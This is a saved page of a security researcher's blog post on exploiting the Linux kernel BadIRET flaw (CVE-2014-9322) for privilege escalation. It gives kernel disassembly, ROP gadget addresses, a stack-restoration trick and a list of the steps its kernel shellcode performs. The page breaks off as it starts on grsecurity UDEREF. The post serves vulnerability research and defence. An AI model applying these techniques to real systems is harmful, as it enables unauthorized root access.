<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0029)http://blog.pi3.com.pl/?p=509 -->
<html xmlns="http://www.w3.org/1999/xhtml"><head profile="http://gmpg.org/xfn/11"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">





<meta name="distribution" content="global">


<meta name="robots" content="follow, all">


<meta name="language" content="en, sv">





<title>  Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322) : pi3 blog</title>


<meta name="generator" content="WordPress 5.8.2">


<!-- leave this for stats please -->





<link rel="Shortcut Icon" href="http://blog.pi3.com.pl/wp-content/themes/gods-and-monsters/images/favicon.ico" type="image/x-icon">


<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://blog.pi3.com.pl/?feed=rss2">


<link rel="alternate" type="text/xml" title="RSS .92" href="http://blog.pi3.com.pl/?feed=rss">


<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="http://blog.pi3.com.pl/?feed=atom">


<link rel="pingback" href="http://blog.pi3.com.pl/xmlrpc.php">


	<link rel="archives" title="July 2021" href="http://blog.pi3.com.pl/?m=202107">
	<link rel="archives" title="April 2021" href="http://blog.pi3.com.pl/?m=202104">
	<link rel="archives" title="January 2021" href="http://blog.pi3.com.pl/?m=202101">
	<link rel="archives" title="December 2020" href="http://blog.pi3.com.pl/?m=202012">
	<link rel="archives" title="October 2020" href="http://blog.pi3.com.pl/?m=202010">
	<link rel="archives" title="September 2020" href="http://blog.pi3.com.pl/?m=202009">
	<link rel="archives" title="June 2020" href="http://blog.pi3.com.pl/?m=202006">
	<link rel="archives" title="May 2020" href="http://blog.pi3.com.pl/?m=202005">
	<link rel="archives" title="March 2020" href="http://blog.pi3.com.pl/?m=202003">
	<link rel="archives" title="October 2019" href="http://blog.pi3.com.pl/?m=201910">
	<link rel="archives" title="July 2019" href="http://blog.pi3.com.pl/?m=201907">
	<link rel="archives" title="May 2019" href="http://blog.pi3.com.pl/?m=201905">
	<link rel="archives" title="April 2019" href="http://blog.pi3.com.pl/?m=201904">
	<link rel="archives" title="February 2019" href="http://blog.pi3.com.pl/?m=201902">
	<link rel="archives" title="August 2018" href="http://blog.pi3.com.pl/?m=201808">
	<link rel="archives" title="July 2018" href="http://blog.pi3.com.pl/?m=201807">
	<link rel="archives" title="March 2018" href="http://blog.pi3.com.pl/?m=201803">
	<link rel="archives" title="February 2018" href="http://blog.pi3.com.pl/?m=201802">
	<link rel="archives" title="January 2018" href="http://blog.pi3.com.pl/?m=201801">
	<link rel="archives" title="April 2017" href="http://blog.pi3.com.pl/?m=201704">
	<link rel="archives" title="September 2016" href="http://blog.pi3.com.pl/?m=201609">
	<link rel="archives" title="July 2015" href="http://blog.pi3.com.pl/?m=201507">
	<link rel="archives" title="February 2015" href="http://blog.pi3.com.pl/?m=201502">
	<link rel="archives" title="March 2014" href="http://blog.pi3.com.pl/?m=201403">
	<link rel="archives" title="August 2013" href="http://blog.pi3.com.pl/?m=201308">
	<link rel="archives" title="July 2013" href="http://blog.pi3.com.pl/?m=201307">
	<link rel="archives" title="May 2013" href="http://blog.pi3.com.pl/?m=201305">
	<link rel="archives" title="April 2013" href="http://blog.pi3.com.pl/?m=201304">
	<link rel="archives" title="March 2013" href="http://blog.pi3.com.pl/?m=201303">
	<link rel="archives" title="February 2013" href="http://blog.pi3.com.pl/?m=201302">
	<link rel="archives" title="October 2012" href="http://blog.pi3.com.pl/?m=201210">
	<link rel="archives" title="May 2012" href="http://blog.pi3.com.pl/?m=201205">
	<link rel="archives" title="April 2012" href="http://blog.pi3.com.pl/?m=201204">
	<link rel="archives" title="December 2011" href="http://blog.pi3.com.pl/?m=201112">
	<link rel="archives" title="September 2011" href="http://blog.pi3.com.pl/?m=201109">
	<link rel="archives" title="August 2011" href="http://blog.pi3.com.pl/?m=201108">
	<link rel="archives" title="July 2011" href="http://blog.pi3.com.pl/?m=201107">
	<link rel="archives" title="March 2011" href="http://blog.pi3.com.pl/?m=201103">
	<link rel="archives" title="November 2010" href="http://blog.pi3.com.pl/?m=201011">
	<link rel="archives" title="October 2010" href="http://blog.pi3.com.pl/?m=201010">
	<link rel="archives" title="July 2010" href="http://blog.pi3.com.pl/?m=201007">
	<link rel="archives" title="May 2010" href="http://blog.pi3.com.pl/?m=201005">
	<link rel="archives" title="March 2010" href="http://blog.pi3.com.pl/?m=201003">
	<link rel="archives" title="February 2010" href="http://blog.pi3.com.pl/?m=201002">
	<link rel="archives" title="January 2010" href="http://blog.pi3.com.pl/?m=201001">
	<link rel="archives" title="December 2009" href="http://blog.pi3.com.pl/?m=200912">
	<link rel="archives" title="November 2009" href="http://blog.pi3.com.pl/?m=200911">
	<link rel="archives" title="October 2009" href="http://blog.pi3.com.pl/?m=200910">
	<link rel="archives" title="September 2009" href="http://blog.pi3.com.pl/?m=200909">


<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="http://s.w.org/">
<link rel="alternate" type="application/rss+xml" title="pi3 blog » Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322) Comments Feed" href="http://blog.pi3.com.pl/?feed=rss2&amp;p=509">
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/blog.pi3.com.pl\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.2"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/wp-emoji-release.min.js.下載" type="text/javascript" defer=""></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="wp-block-library-css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/style.min.css" type="text/css" media="all">
<style id="wp-block-library-inline-css" type="text/css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="mediaelement-css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/mediaelementplayer-legacy.min.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-mediaelement-css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/wp-mediaelement.min.css" type="text/css" media="all">
<link rel="stylesheet" id="cptch_stylesheet-css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/front_end_style.css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="cptch_desktop_style-css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/desktop_style.css" type="text/css" media="all">
<link rel="stylesheet" id="jetpack_css-css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/jetpack.css" type="text/css" media="all">
<link rel="https://api.w.org/" href="http://blog.pi3.com.pl/index.php?rest_route=/"><link rel="alternate" type="application/json" href="http://blog.pi3.com.pl/index.php?rest_route=/wp/v2/posts/509"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.pi3.com.pl/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.pi3.com.pl/wp-includes/wlwmanifest.xml"> 
<meta name="generator" content="WordPress 5.8.2">
<link rel="canonical" href="http://blog.pi3.com.pl/?p=509">
<link rel="shortlink" href="http://blog.pi3.com.pl/?p=509">
<link rel="alternate" type="application/json+oembed" href="http://blog.pi3.com.pl/index.php?rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fblog.pi3.com.pl%2F%3Fp%3D509">
<link rel="alternate" type="text/xml+oembed" href="http://blog.pi3.com.pl/index.php?rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fblog.pi3.com.pl%2F%3Fp%3D509&amp;format=xml">
<style type="text/css">img#wpstats{display:none}</style>
		

<link rel="stylesheet" type="text/css" href="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/style.css" media="screen">





<!--[if IE]>


<link rel="stylesheet" type="text/css" href="http://blog.pi3.com.pl/wp-content/themes/gods-and-monsters/ie.css" media="screen" />


<![endif]-->








</head>





<body>





<!--[if lte IE 6]>


<div style="border:4px solid #302831; margin:8px auto; background:#bcab8b; color:#302821; width:700px;">


  <p style="font-size:22px; margin:8px; padding:0;">


    Hello! This page looks wacky because you're using an outdated version of Internet Explorer, one which this site no longer supports. 


  </p>


  <p style="margin:8px; padding:0;">


    Instead of upgrading to the new Internet Explorer, consider trying a free browser like Firefox. It's free, has all the same features as Internet Explorer, and will work much faster. If you would like to try Firefox, it's available as a free download at <a href="http://www.mozilla.com/en-US/firefox/personal.html">Mozilla</a>.</p>  


</div>


<![endif]-->





<div id="headerwrap">


    <div id="header">


        <div id="headertitle">


	    <h1>pi3 blog</h1>


	 </div>


	 <div id="tag">


	     bug bugs bughunt exploit exploiting research vulnerabilities

	 </div>


	 <div id="nav">


	     <ul>


		 <li class=""><a href="http://blog.pi3.com.pl/" title="A link to home page">Home</a></li>						 


		 <li class="page_item page-item-2"><a href="http://blog.pi3.com.pl/?page_id=2">About</a></li>





	     </ul>


	 </div> 


         <div id="quote"><p>“He who fights with monsters should be careful lest he thereby become a   


  monster. And if thou gaze long into an abyss, the abyss will also gaze into thee.”</p>


         <p style="margin:-10px 0 0 0; text-align:right;">~Friedrich Nietzsche</p>


         </div>





     </div>


<div style="clear:both;"></div>	





	





<div id="wrapper">



	<div id="sidebar">


	<ul>





        <li id="rss">


			<p class="rss">Subscribe</p><a href="http://blog.pi3.com.pl/?feed=rss2"><img src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/rss.png" alt="rss"></a>


	</li>


        </ul>


<div id="search">


	     <p class="sidetitle">Search</p>


		<div id="search-box">


		<form id="searchbox" method="get" action="http://blog.pi3.com.pl/index.php">


	   		<input type="text" value="Press enter to search." name="s" id="f" onfocus="if (this.value == &#39;Press enter to search.&#39;) {this.value = &#39;&#39;;}" onblur="if (this.value == &#39;&#39;) {this.value = &#39;Press enter to search.&#39;;}">


			</form>


		</div>


	</div>




        <ul>       


        


<li id="categories-3" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>
			<ul>
					<li class="cat-item cat-item-4"><a href="http://blog.pi3.com.pl/?cat=4">Bughunt</a> (26)
</li>
	<li class="cat-item cat-item-5"><a href="http://blog.pi3.com.pl/?cat=5">Exploiting</a> (33)
</li>
	<li class="cat-item cat-item-6"><a href="http://blog.pi3.com.pl/?cat=6">Ideas</a> (27)
</li>
	<li class="cat-item cat-item-7"><a href="http://blog.pi3.com.pl/?cat=7">LKRG</a> (10)
</li>
	<li class="cat-item cat-item-3"><a href="http://blog.pi3.com.pl/?cat=3">Meeting</a> (6)
</li>
	<li class="cat-item cat-item-1"><a href="http://blog.pi3.com.pl/?cat=1">O wszystkim i o niczym</a> (31)
</li>
			</ul>

			</li>
		<li id="recent-posts-3" class="widget widget_recent_entries">
		<h2 class="widgettitle">Recent Posts</h2>
		<ul>
											<li>
					<a href="http://blog.pi3.com.pl/?p=894">My talks @ BlackHat 2021 and DefCon29</a>
									</li>
											<li>
					<a href="http://blog.pi3.com.pl/?p=890">LKRG 0.9.0 has been released!</a>
									</li>
											<li>
					<a href="http://blog.pi3.com.pl/?p=850">Windows 7 TCP/IP hijacking</a>
									</li>
											<li>
					<a href="http://blog.pi3.com.pl/?p=831">The short story of broken KRETPROBES and OPTIMIZER in Linux Kernel</a>
									</li>
											<li>
					<a href="http://blog.pi3.com.pl/?p=780">CVE-2020-16898 – Exploiting “Bad Neighbor” vulnerability</a>
									</li>
					</ul>

		</li><li id="archives-3" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>
			<ul>
					<li><a href="http://blog.pi3.com.pl/?m=202107">July 2021</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202104">April 2021</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202101">January 2021</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202012">December 2020</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202010">October 2020</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202009">September 2020</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202006">June 2020</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202005">May 2020</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=202003">March 2020</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201910">October 2019</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201907">July 2019</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201905">May 2019</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201904">April 2019</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201902">February 2019</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201808">August 2018</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201807">July 2018</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201803">March 2018</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201802">February 2018</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201801">January 2018</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201704">April 2017</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201609">September 2016</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201507">July 2015</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201502">February 2015</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201403">March 2014</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201308">August 2013</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201307">July 2013</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201305">May 2013</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201304">April 2013</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201303">March 2013</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201302">February 2013</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201210">October 2012</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201205">May 2012</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201204">April 2012</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201112">December 2011</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201109">September 2011</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201108">August 2011</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201107">July 2011</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201103">March 2011</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201011">November 2010</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201010">October 2010</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201007">July 2010</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201005">May 2010</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201003">March 2010</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201002">February 2010</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=201001">January 2010</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=200912">December 2009</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=200911">November 2009</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=200910">October 2009</a></li>
	<li><a href="http://blog.pi3.com.pl/?m=200909">September 2009</a></li>
			</ul>

			</li><li id="linkcat-2" class="widget widget_links"><h2 class="widgettitle">Friends</h2>
	<ul class="xoxo blogroll">
<li><a href="http://bothunters.pl/">Bothunters – Borys Łącki</a></li>
<li><a href="http://gynvael.coldwind.pl/">Gynvael Coldwind</a></li>
<li><a href="http://www.icewall.pl/">Icewall</a></li>
<li><a href="http://j00ru.vexillium.org/">j00ru</a></li>
<li><a href="http://piotrbania.com/">Piotr Bania</a></li>

	</ul>
</li>
<li id="pages-3" class="widget widget_pages"><h2 class="widgettitle">Pages</h2>
			<ul>
				<li class="page_item page-item-2"><a href="http://blog.pi3.com.pl/?page_id=2">About</a></li>
			</ul>

			</li>

	</ul>


			


</div>








	<div id="content">	



                


                <div class="postheader">



                <div id="date"><p class="datea">4</p> <p class="dateb" style=" margin-top:-9px;">Jul</p></div>



		<div id="posttitle"><h1><a href="http://blog.pi3.com.pl/?p=509" rel="bookmark">Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322)</a></h1></div>

                <div style="clear:both;"></div>

                        <p class="author">by pi3</p>

                </div>

		

		<p>Hi,</p>
<p>The journey into <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322" target="_blank">CVE-2014-9322</a> is not straightforward but it is worth to spend some time on it and analyze all available information. I will try my best…</p>
<p><span id="more-509"></span></p>
<p><strong>1) Introduction – non-technical (almost)</strong></p>
<p>Everything starts from the <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090" target="_blank">CVE-2014-9090</a>. This vulnerability was discovered by Andy Lutomirski which allows you (quoting MITRE):</p>
<blockquote><p>“The do_double_fault function in arch/x86/kernel/traps.c in the Linux kernel through 3.17.4 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to cause a denial of service (panic) (…)”</p></blockquote>
<p>which essentially may results in local DoS attack. It doesn’t sounds so critical from the defender’s point of view (but still it takes attention especially from the nature of vulnerability point of view) neither from the attackers perspective. Mainly because of the potential limited benefits after successful exploitation.</p>
<p>The “fun” starts after Borislav Petkov asked some questions about <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090" target="_blank">CVE-2014-9090</a>. Andy Lutomirski discovered another vulnerability in the same functionality which was masked by first one. (Un)fortunately this time it was very serious (I would say critical) flaw. Linux kernel does not properly handle faults associated with the Stack Segment (SS) register in the x86 architecture. Quoiting MITRE again:</p>
<blockquote><p>“(…) allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space.”</p></blockquote>
<p>Does the nature of vulnerability sound familiar?</p>
<p>What about Rafal ‘n3rgal’ Wojtczuk research which ends up receiving <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217" target="_blank">CVE-2012-0217</a>? (which was directly connected with <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744" target="_blank">CVE-2006-0744</a>).<br>
Yes… in principals both vulnerabilities gave us same thing – we can force kernel to be executed under user-controlled GS base address (via %gs register).</p>
<p>For some reasons <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322" target="_blank">CVE-2014-9322</a> didn’t take much attention (again similarities to <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744" target="_blank">CVE-2006-0744</a>) until Rafal ‘n3rgal’ Wojtczuk didn’t point it out on 2nd of February 2015 via publish amazing research on Bromium Labs blog:</p>
<p><a href="http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/" target="_blank">http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/</a></p>
<p>about how the nature of vulnerability works, how it can be used to achieve code-exec (which is not trivial – great research!) and using single NULL-byte write primitive turn into fully weaponized exploit which bypasses SMEP mitigation (not SMAP). Highly recommended to review it in details.</p>
<p>After this publication vulnerability started to get more and more attention (especially from the grsecurity twitter account :)). Until now (almost half a year) there is not known public real exploit which will fully implement Rafal’s idea to achieve code-execution. There is only Proof-Of-Concept available which results in DoS attack (so the same as results of <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090" target="_blank">CVE-2014-9090</a> – not very useful):</p>
<p><a href="https://rdot.org/forum/showthread.php?t=3341" target="_blank">https://rdot.org/forum/showthread.php?t=3341</a></p>
<p>which ends up being here:</p>
<p><a href="https://www.exploit-db.com/exploits/36266/" target="_blank">https://www.exploit-db.com/exploits/36266/</a></p>
<p>&nbsp;</p>
<p><strong>2) More technical part (based on Fedora 20 -&gt; kernel: 3.11.10-301.fc20.x86_64)</strong></p>
<p>I decided to take a challenge and fully implement Rafal’s idea and end-up being successed solving some interesting problems during the work. I will start where Rafal finished his write-up, which means we end up successfully stack pivoting and executing ROP gadgets (in his case disabling SMEP in CR4 register and executing ‘real’ shellcode/kernelcode in userland page).</p>
<p>*) Stack pivoting and ROP are being executed in the context of follow_link() function which is inlined in path_openat(). The context flow can be summarized as follow:</p>
<pre>SyS_open -&gt; SYSC_open -&gt; do_sys_open -&gt; do_filp_open -&gt; path_openat -&gt; follow_link()</pre>
<p>Inlined function do relative call which in the end redirect transfer to our code:</p>
<p><code></code></p><code>
<pre>...
   0xffffffff811b84ab &lt;+955&gt;:   jmpq   0xffffffff811b81b3 <path_openat+195>
   0xffffffff811b84b0 &lt;+960&gt;:   movl   $0x4,0x40(%r12)
   0xffffffff811b84b9 &lt;+969&gt;:   mov    0x30(%r15),%rax
   0xffffffff811b84bd &lt;+973&gt;:   mov    %r15,%rdi
   0xffffffff811b84c0 &lt;+976&gt;:   mov    %r12,%rsi
   0xffffffff811b84c3 &lt;+979&gt;:   mov    0x20(%rax),%rax
   0xffffffff811b84c7 &lt;+983&gt;:   callq  *0x8(%rax)
                                ^^^^^^^^^^^^^^^^^
   0xffffffff811b84ca &lt;+986&gt;:   cmp    $0xfffffffffffff000,%rax
   0xffffffff811b84d0 &lt;+992&gt;:   mov    %rax,%r15
   0xffffffff811b84d3 &lt;+995&gt;:   jbe    0xffffffff811b8532 <path_openat+1090>
   0xffffffff811b84d5 &lt;+997&gt;:   mov    %r12,%rdi
   0xffffffff811b84d8 &lt;+1000&gt;:  mov    %eax,%ebx
   0xffffffff811b84da &lt;+1002&gt;:  callq  0xffffffff811b2930 <path_put>
...</path_put></path_openat+1090></path_openat+195></pre>
</code><p><code></code></p>
<p>After our code has being executed first problems start (cleaning part). Every call to function path_put(), do_last(), dput(), mntput() or put_link(), may ends up playing with kernel locks. Because the stack is pivoted this will not going to be happy ending. Additionally, path_openat() has inline many functionalities, some registers have special meaning (pointers to the structures/objects) which kernel will try to access at some point at may results in kernel crash and/or panic.<br>
At the beginning I was trying to track down all problematic execution and manually fixing it but there is just too many correlation between registers/objects/spinlocks… (btw. Linux kernel 3.xx changed internal representation of raw_spin_lock comparing to previous kernels which is (un)fortunately much more problematic when you want manually synchronize it).<br>
There needed to be better solution, and if you think about pivoting itself you may find one. If you instead of manual fixing all necessary problems force kernel to do it you may win that game. If you find a way to “restore” original stack frame for the function before stack pivoting was taken kernel should naturally remove all locks and correctly unwind the stack and system will be stable. This can be achieved via let’s call it reverse stack pivoting <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"> Directly after stack pivot, in temporary register you should have valid address of the stack which you want to know. In our case situation is a bit more complicate because we are losing 32 most significant bits of the address. ROP gadget looks like:</p>
<pre>   0xffffffff8119f1ed &lt;__mem_cgroup_try_charge+1949&gt;:   xchg   %eax,%esp
   0xffffffff8119f1ee &lt;__mem_cgroup_try_charge+1950&gt;:   retq
</pre>
<p>why this gadget was taken and we lose 32bits (we want to)? Please read Rafal’s write-up<br>
So if we find some ROP gadget which directly after stack pivoting will save 32 least significant bits of original stack pointer in safe place, we could try to restore it and reconstruct original address before we gave control to the kernel. I’ve chosen following ROP-gadget:</p>
<pre>   0xffffffff8152d8fe <kernel_listen+14>:       push   %rax
   0xffffffff8152d8ff <kernel_listen+15>:       pop    %rax
   0xffffffff8152d900 <kernel_listen+16>:       pop    %rbp
   0xffffffff8152d901 <kernel_listen+17>:       retq
</kernel_listen+17></kernel_listen+16></kernel_listen+15></kernel_listen+14></pre>
<p>which essentially push %rax value (in fact high bits are zeroed) and move stack pointer after stored value. At this point we may precisely calculate where it will be stored.</p>
<p>Problem solved (reverse-stack pivot won :P)</p>
<p>*) If your shellcode is going to be executed for too long there is high chance scheduler will preempt you which sometimes may be critical – depends on the current stage of execution and what is going to be preempting you. Quite often you may receive APIC timer interrupt connected with updating process times (known as tick’ing) which may screw you up on some corner cases – it should be taken into account!</p>
<p>btw. if you have bad luck you may be preempted as soon as you did stack pivoting ;p</p>
<p>*) Our code is executed while proc_root structure is corrupted… <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"> This is NOT what we would like to have. It dramatically increases chance of kernel crash if other process will do any operation on /proc pseudo-filesystem. proc_root.subdir value must be restored as soon as it can be to decrease the chance of random crash. There is few possible ways of doing it:</p>
<p>a) instead of overwriting 6 bytes of subdir do only 5 of them which will leave 3 bytes untouched. This means we can easily reconstruct original value by adding 0xffff8800 value at the most significant bits (for that kernel) and trying to find only 1 byte which is 256 possibilities. Chance of crash is very low (touching not mapped page). Additionally this requires allocation in user space around 16 MB to have guarantee that after referencing overwritten proc_root.subdir always ends up in our controlled memory.</p>
<p>b) we can brute force full address by ‘preventing’ from Page Fault (#PF). For the short period of time we can overwrite #PF handler with simple code:</p>
<ol>– Get the exception from the stack<br>
– Change the address which caused crash to smth which we know is mapped<br>
– Restart faulting instruction</ol>
<p>original brute force loop will continue running</p>
<p>c) Ignore all of the problems and just reconstruct address as much as it can be and do brute force rest of the bytes. Apparently it’s quite reliable and effective. We know that high significant bytes are 0xffff8800 and we have 2 least significant bytes. We need to find 2 bytes which are unknown for us. On Linux (as opposed to Windows) kernel memory are not being paged out (swapped out). Chance of hitting unmapped page is quite low when we brute force just 2 bytes in the middle of reconstructed address – believe me or not, it works well <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"></p>
<p>Problem is also how we judge if the address is correct or not. It’s quite simple, struct proc_dir_entry has ‘parent’ field. We must find address which will have on the specific offset, address of proc_root (which is known). In the end we check 65536 addresses and chance of FP is low as well. I’ve never hit that situation.</p>
<p>Summarizing our shellcode must:</p>
<ol>
– save original stack pointer value<br>
– disable interrupts (to prevent from being preempted) and start to reconstruct corrupted proc_root.subdir value<br>
– do REAL (s)hellcode<br>
– restore original stack pointer<br>
– restore frame pointer<br>
– restore registers pointing to the internal objects<br>
– enable interrupts and return to the normal kernel execution
</ol>
<p>&nbsp;</p>
<p><strong>3) Grsecurity =&gt; UDEREF</strong></p>
<p>As I mentioned Rafal’s research has been “sighted” by spender via:</p>
<p><a href="http://twitter.com/grsecurity/status/562363332079144960" target="_blank">http://twitter.com/grsecurity/status/562363332079144960</a><br>
<a href="http://twitter.com/grsecurity/status/562363788125831172" target="_blank">http://twitter.com/grsecurity/status/562363788125831172</a></p>
<p>Additionally some people suggests UDEREF is as effective as SMAP with blocking exploitation of this vulnerability:</p>
<p><a href="http://seclists.org/oss-sec/2014/q4/1052" target="_blank">http://seclists.org/oss-sec/2014/q4/1052</a></p>
<blockquote><p>
“This is likely to be easy to exploit for privilege escalation, except<br>
on systems with SMAP or UDEREF.  On those systems, assuming that the<br>
mitigation works correctly, the impact of this bug may be limited to<br>
massive memory corruption and an eventual crash or reboot.”</p></blockquote>
<p>This is not completely true. UDEREF may be as effective (in fact even more) as SMAP or only as effective as SMEP (on AMD64) which will not prevent exploitation at all (using described technique). So what’s going on? <img draggable="false" role="img" class="emoji" alt="🙂" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/1f642.svg"> Currently UDEREF for AMD64 has 3 different implementations:</p>
